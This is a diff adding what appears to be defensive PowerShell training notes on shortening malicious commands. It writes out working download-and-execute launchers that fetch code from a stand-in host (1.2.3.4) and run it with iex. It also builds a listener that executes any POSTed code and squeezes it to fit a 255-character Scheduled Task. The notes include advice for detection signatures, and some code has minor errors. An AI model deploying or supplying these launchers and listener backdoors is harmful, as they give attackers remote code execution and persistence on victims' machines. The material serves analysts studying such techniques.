@@ -3142,3 +3142,157 @@ Existing aliases are used to shorten up a malicious PowerShell command or to mak
 
 sal block-website iwr
 block-website -uri http://1.2.3.4
+
+
+
+Shortening the Request
+A launcher script is a minimal amount of code that runs from a smaller space and retrieves a larger amount of code from a remote location. However, at times, even the launcher script might have a reduced amount of space to reside in, such as 255 characters for a Scheduled Task. There are several techniques used to make PowerShell commands shorter, enabling the code to fit into a constrained space. Seeing these techniques used in a script may indicate that the script is malicious.
+
+﻿
+
+Shortening the Callback Request
+﻿
+
+The example below is a simple launcher script that downloads code from a remote site via HTTP, stores that code in a variable $data, and executes the code.
+
+$data = (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
+Invoke-Expression $data
+﻿
+
+Currently, this is 108 characters. The pipe command can be used so that the $data variable is not needed.
+
+Invoke-Expression (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
+﻿
+
+Removing the $data variable shortens the script to 93 characters. The System in System.Net.WebClient is not required and Invoke-Expression has a default alias of iex.
+
+iex (New-Object Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
+﻿
+
+Removing those items brings the request down to 72 characters. The http:// is assumed so it is not required; this brings the total down to 65 characters.
+
+iex (New-Object Net.WebClient).DownloadFile("1.2.3.4/index.html")
+﻿
+
+Changing the command to the alias for Invoke-WebRequest brings this launcher down even further to only 36 characters.
+
+iex (iwr 1.2.3.4/index.html).Content
+﻿
+
+Depending on the resource name, this line could be even shorter. It does not take many characters for an attacker to gain full control of a system with PowerShell. 
+
+Remain aware of aliases when writing detection signatures, as targeting only full cmdlet names without accounting for abbreviated versions like iwr may result in missed alerts.﻿
+
+﻿
+
+Shortening a Webserver
+﻿
+
+This is the original webserver. It executes whatever is sent over a POST command and is 520 characters. The max size for a schtasks command is 255 characters.
+
+$http = New-Object System.Net.HttpListener
+$http.Prefixes.Add("http://0.0.0.0:8080/")
+$http.Start()
+$context = $http.GetContext()
+$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
+[string]$html = "<h1>A PowerShell Webserver</h1>" 
+$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
+$context.Response.ContentLength64 = $buffer.Length
+$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
+$context.Response.OutputStream.Close() 
+$http.Stop()
+Invoke-Expression $data
+﻿
+
+Using shortening techniques, the size of the webserver code below is reduced down to 367 characters. The techniques included making the variable names single characters, removing all the System prefixes, removing extra spaces between the = signs, removing html, and using a condensed syntax to create the HttpListener object.
+
+$a=[Net.HttpListener]::new() 
+$a.Prefixes.Add("http://0.0.0.0:8080/")
+$a.Start()
+$c=$a.GetContext()
+$d=[IO.StreamReader]::new($c.Request.InputStream).ReadToEnd()
+[string]$h="" 
+$b=[Text.Encoding]::UTF8.GetBytes($h) 
+$c.Response.ContentLength64=$b.Length
+$c.Response.OutputStream.Write($b, 0, $b.Length)
+$c.Response.OutputStream.Close() 
+$http.Stop()
+iex $d
+﻿
+
+Additional space reduction techniques can be implemented. In the case of this webserver, which is only being used to receive additional code for execution, sending data back to the client is not required, so those parts can be removed. With those omissions implemented in the code below, this brings the total size down to 214 characters.
+
+$a=[Net.HttpListener]::new() 
+$a.Prefixes.Add("http://0.0.0.0:8080/")
+$a.Start()
+$c=$a.GetContext()
+iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd()
+$c.Response.OutputStream.Close() 
+$a.Stop()
+﻿
+
+Taking advantage of |% being an alias for passing an object to a ForEach loop, and using $_ reference to that object, all the variables can be removed. This allows the entire webserver to come down to 157 characters. However, the webserver does not close gracefully, so repeated runs in the same powershell.exe process do not work. The client sending the data to the server hangs.
+
+[Net.HttpListener]::new()|%{
+  $_.Prefixes.Add("http://0.0.0.0:8080/");
+  $_.Start();
+  iex ([IO.StreamReader]::new($_.GetContext().Request.InputStream)).ReadToEnd()
+}
+﻿
+
+To ensure the listening launcher shuts down properly, a Response.OutStream command is included and the code is slightly modified, bringing the total size to 206 characters. That is still small enough to fit in the Schedule Task space limitations while resulting in a webserver that closes gracefully and does not cause the client connection to hang.
+
+[Net.HttpListener]::new()|%{
+  $_.Prefixes.Add("http://0.0.0.0:8080/");
+  $_.Start();
+  $c=$_.GetContext();
+  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
+  $c.Response.OutputStream.Close();
+  $_.stop()
+}
+﻿
+
+Shortening the PowerShell.exe Call
+﻿
+
+If a launcher is being called outside PowerShell.exe, then the launcher command needs to be passed to the executable with several options. PowerShell options do not require the entire option spelled out, only enough of the characters to uniquely identify the option.
+
+﻿
+
+Table 12.3-2 lists all the options that PowerShell.exe accepts with minimal unique characters. Since four options start with No, to specify the NoProfile option, -nop needs to be specified at a minimum. Likewise, since only one option starts with the letter V to specify Version, then only -v needs to be given. 
+
+
+ ![image](https://github.com/user-attachments/assets/18603168-0ae6-4d49-994b-d84ef04b1d3a)
+
+
+
+This works for all options provided to PowerShell commands. Invoke-WebRequest has the following options starting with the letter M, -Method and -MaximumRedirection, and only one option starting with the letter B. That means these two commands do the same thing.
+iwr http://127.0.0.1:8080/ -Method POST -Body 'get-process'
+
+and
+
+iwr http://127.0.0.1:8080/ -Me POST -B 'get-process'
+
+
+
+![image](https://github.com/user-attachments/assets/be29702d-2abd-4240-b7cf-a10f709fcf34)
+
+
+![image](https://github.com/user-attachments/assets/ac937417-746a-4934-aa48-691a5a8aaf9e)
+
+
+
+![image](https://github.com/user-attachments/assets/9fbb62b4-0c1b-4f90-b0a3-b3e0222b57ec)
+
+
+
+
+![image](https://github.com/user-attachments/assets/9fbb62b4-0c1b-4f90-b0a3-b3e0222b57ec)
+
+![image](https://github.com/user-attachments/assets/ac937417-746a-4934-aa48-691a5a8aaf9e)
+
+
+
+
+
+
